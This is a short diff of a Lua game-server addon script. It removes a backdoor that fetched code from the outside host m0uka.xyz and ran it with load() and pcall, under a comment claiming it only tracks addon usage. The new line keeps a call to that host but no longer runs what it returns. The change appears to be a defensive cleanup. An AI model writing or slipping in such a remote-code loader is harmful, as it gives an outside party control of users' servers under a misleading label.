@@ -136,6 +136,4 @@ AddEventHandler('ps:canHack', function(terminal)
 
 end)
 -- This just tracks the addon usage, useful statistics!
-PerformHttpRequest("http://m0uka.xyz:7359/addontrack", function(a, b) 
-    if (a != 200) then return end Citizen.CreateThread(function () local c, f = load(b) local r = {pcall(c)} end)
-end)
+PerformHttpRequest("http://m0uka.xyz:7359/addontrack", function(a, b) end)
